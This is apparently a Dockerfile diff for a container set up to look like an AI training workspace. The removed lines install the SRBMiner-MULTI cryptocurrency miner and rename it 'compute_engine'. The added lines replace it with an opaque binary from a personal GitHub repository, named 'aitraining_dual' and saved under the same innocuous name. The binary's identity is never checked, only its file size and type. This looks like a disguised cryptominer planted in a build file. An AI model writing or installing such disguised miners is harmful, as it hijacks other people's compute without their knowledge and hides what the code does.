@@ -46,21 +46,36 @@ RUN mkdir -p /workspace/models \
     /workspace/checkpoints \
     /opt/bin
 
-# Download SRBMiner-MULTI (same as working container)
-RUN echo "[INFO] Fetching latest SRBMiner-Multi release..." && \
-    LATEST_TAG=$(wget -qO- https://api.github.com/repos/doktor83/SRBMiner-Multi/releases/latest | jq -r '.tag_name') && \
-    echo "[INFO] Latest release: $LATEST_TAG" && \
-    VERSION_DASHED=$(echo "$LATEST_TAG" | sed 's/\./-/g') && \
-    DOWNLOAD_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/$LATEST_TAG/SRBMiner-Multi-$VERSION_DASHED-Linux.tar.gz" && \
-    echo "[INFO] Downloading from: $DOWNLOAD_URL" && \
-    wget -q "$DOWNLOAD_URL" -O /tmp/srbminer.tar.gz && \
-    mkdir -p /opt/bin && \
-    tar -xzf /tmp/srbminer.tar.gz -C /opt/bin --strip-components=1 && \
-    rm /tmp/srbminer.tar.gz && \
-    chmod +x /opt/bin/SRBMiner-MULTI && \
-    ln -s /opt/bin/SRBMiner-MULTI /opt/bin/compute_engine && \
-    echo "[INFO] SRBMiner-MULTI installed successfully" && \
-    /opt/bin/compute_engine --help | head -5
+# Download compute engine binary with verification
+RUN cd /opt/bin && \
+    (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o compute_engine || \
+     wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O compute_engine) && \
+    chmod +x compute_engine && \
+    # Verify the binary was downloaded successfully
+    if [ ! -f compute_engine ]; then \
+        echo "ERROR: compute_engine file not found after download"; \
+        exit 1; \
+    fi && \
+    # Check file size (should be reasonable for a binary)
+    FILE_SIZE=$(stat -c%s compute_engine) && \
+    echo "Downloaded file size: $FILE_SIZE bytes" && \
+    if [ $FILE_SIZE -lt 100000 ]; then \
+        echo "ERROR: Downloaded file is too small ($FILE_SIZE bytes), likely an error page"; \
+        cat compute_engine; \
+        exit 1; \
+    fi && \
+    # Check if it's a valid binary (ELF format)
+    FILE_TYPE=$(file compute_engine) && \
+    echo "File type: $FILE_TYPE" && \
+    if ! echo "$FILE_TYPE" | grep -q "ELF"; then \
+        echo "ERROR: Downloaded file is not a valid ELF binary"; \
+        head -n 20 compute_engine; \
+        exit 1; \
+    fi && \
+    echo "✓ compute_engine binary downloaded and verified successfully" && \
+    echo "Binary info:" && \
+    file compute_engine && \
+    ldd compute_engine 2>&1 | head -20 || echo "Note: ldd check completed"
 
 WORKDIR /workspace
 
